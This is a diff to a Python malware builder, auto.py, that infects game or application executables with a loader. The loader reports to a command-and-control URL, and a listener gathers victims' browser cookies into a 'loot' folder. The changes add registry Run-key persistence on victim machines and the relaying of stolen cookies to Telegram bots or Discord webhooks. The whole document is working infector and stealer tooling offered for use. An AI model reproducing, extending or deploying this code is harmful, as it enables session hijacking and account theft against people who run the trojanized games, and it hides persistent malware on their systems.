@@ -18,6 +18,9 @@ Usage:
     python auto.py "C:\\path\\game folder"  # CLI: infect folder (game/app)
     python auto.py game.exe --run       # CLI + run infected locally (test)
     python auto.py --port 9400          # custom C2 port (default: 9090)
+    python auto.py game.exe --persist   # install registry Run key on victim
+    python auto.py game.exe --telegram bot_token:chat_id   # relay via Telegram
+    python auto.py game.exe --discord https://discord.com/api/webhooks/...  # relay via Discord
 
 Output structure:
     ifec/
@@ -50,6 +53,8 @@ LISTEN = os.path.join(HERE, "listen.py")
 BUILD  = os.path.join(HERE, "build.bat")
 MAGIC  = b"CKLG"
 C2_SENTINEL = b"CKC2_DEADBEEF_"
+PERSIST_SENTINEL = b"CKPR____"
+PERSIST_ENABLE = b"CKPR0001"
 
 def log(msg):
     print(msg, flush=True)
@@ -137,8 +142,8 @@ def find_main_exe(folder):
 
 # ------------------------------------------------------------------ infection
 
-def _patch_loader(loader_bytes, c2_url):
-    """Strip old appended data from loader, patch C2 sentinel. Returns patched bytes."""
+def _patch_loader(loader_bytes, c2_url, persist=False):
+    """Strip old appended data from loader, patch C2 + persistence sentinels. Returns patched bytes."""
     idx = loader_bytes.rfind(MAGIC)
     if idx != -1 and idx > len(loader_bytes) - 12:
         old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
@@ -149,6 +154,10 @@ def _patch_loader(loader_bytes, c2_url):
             url_bytes = c2_url.encode("utf-8")[:255]
             url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
             loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
+    if persist:
+        pidx = loader_bytes.find(PERSIST_SENTINEL)
+        if pidx != -1:
+            loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
     return loader_bytes
 
 def _extract_original_host(host_bytes):
@@ -161,27 +170,27 @@ def _extract_original_host(host_bytes):
             return host_bytes[hidx - 4 - old_hlen : hidx - 4]
     return host_bytes
 
-def build_infected_bytes(host_path, c2_url):
+def build_infected_bytes(host_path, c2_url, persist=False):
     """Read host, patch loader, return infected bytes [loader][host][len][CKLG]."""
     with open(LOADER, "rb") as f:
         loader_bytes = f.read()
     with open(host_path, "rb") as f:
         host_bytes = f.read()
-    loader_bytes = _patch_loader(loader_bytes, c2_url)
+    loader_bytes = _patch_loader(loader_bytes, c2_url, persist)
     host_bytes = _extract_original_host(host_bytes)
     return loader_bytes + host_bytes + struct.pack("<I", len(host_bytes)) + MAGIC
 
-def build_infected_standalone(host_path, c2_url):
+def build_infected_standalone(host_path, c2_url, persist=False):
     """Infect a standalone .exe -> ifec/apps/<name>.exe"""
     os.makedirs(IFEC_APPS, exist_ok=True)
     bname = os.path.basename(host_path)
     out_path = os.path.join(IFEC_APPS, bname)
-    infected = build_infected_bytes(host_path, c2_url)
+    infected = build_infected_bytes(host_path, c2_url, persist)
     with open(out_path, "wb") as f:
         f.write(infected)
     return out_path
 
-def build_infected_folder(host_dir, c2_url):
+def build_infected_folder(host_dir, c2_url, persist=False):
     """Copy folder to ifec/folds/<folder_name>/, infect the main .exe in place.
 
     Returns (out_exe_path, original_exe_path) or (None, None) if no .exe found.
@@ -209,7 +218,7 @@ def build_infected_folder(host_dir, c2_url):
 
     # infect the exe in place: overwrite the copy with the infected version
     dest_exe = os.path.join(dest_folder, os.path.relpath(exe_path, host_dir))
-    infected = build_infected_bytes(exe_path, c2_url)
+    infected = build_infected_bytes(exe_path, c2_url, persist)
     with open(dest_exe, "wb") as f:
         f.write(infected)
 
@@ -222,16 +231,22 @@ def build_infected_folder(host_dir, c2_url):
 
 # ------------------------------------------------------------------ listener
 
-def start_listener(port):
-    """Start listen.py in background. Returns the process handle."""
+def start_listener(port, telegram=None, discord=None):
+    """Start listen.py in background. Returns the process handle.
+    If telegram or discord are provided, listen.py relays received cookies to them."""
     os.makedirs(LOOT, exist_ok=True)
     # clean old loot
     for f in ["cookies.json", "cookies.txt"]:
         p = os.path.join(LOOT, f)
         if os.path.exists(p):
             os.remove(p)
+    cmd = [sys.executable, "-u", LISTEN, str(port)]
+    if telegram:
+        cmd += ["--telegram", telegram]
+    if discord:
+        cmd += ["--discord", discord]
     proc = subprocess.Popen(
-        [sys.executable, "-u", LISTEN, str(port)],
+        cmd,
         cwd=HERE,
         creationflags=0x00000010  # CREATE_NEW_CONSOLE — listener gets its own window
     )
@@ -472,6 +487,9 @@ def main():
     port = 9090
     host_arg = None
     run_local = False
+    telegram = None
+    discord = None
+    persist = False
 
     # parse args
     args = sys.argv[1:]
@@ -484,6 +502,12 @@ def main():
             run_local = True; i += 1
         elif a == "--cli":
             i += 1
+        elif a == "--telegram" and i + 1 < len(args):
+            telegram = args[i + 1]; i += 2
+        elif a == "--discord" and i + 1 < len(args):
+            discord = args[i + 1]; i += 2
+        elif a == "--persist":
+            persist = True; i += 1
         elif not a.startswith("--"):
             # join remaining non-flag args as the host path (handles spaces)
             parts = []
@@ -508,6 +532,12 @@ def main():
     ip = detect_ip()
     c2_url = "http://%s:%d/" % (ip, port)
     log("[+] C2 URL: %s" % c2_url)
+    if telegram:
+        log("[+] Telegram relay: enabled")
+    if discord:
+        log("[+] Discord relay: enabled")
+    if persist:
+        log("[+] Persistence: enabled (registry Run key)")
     if ip == "127.0.0.1":
         log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
     if run_local:
@@ -541,7 +571,7 @@ def main():
 
     # 4. start listener
     log("\n[4/5] starting listener...")
-    listener = start_listener(port)
+    listener = start_listener(port, telegram, discord)
     if not listener:
         log("[-] could not start listener")
         return 1
@@ -550,7 +580,7 @@ def main():
     log("\n[5/5] infecting...")
     try:
         if mode == "folder":
-            out_path, orig_exe = build_infected_folder(host_path, c2_url)
+            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist)
             if not out_path:
                 listener.terminate()
                 return 1
@@ -567,7 +597,7 @@ def main():
                 log("  cookies will appear in loot/cookies.json")
             log("=" * 60)
         else:
-            out_path = build_infected_standalone(host_path, c2_url)
+            out_path = build_infected_standalone(host_path, c2_url, persist)
             bname = os.path.basename(out_path)
             log("[+] infected: ifec/apps/%s" % bname)
             log("    loader: %d KB + host: %d KB = %d KB" % (
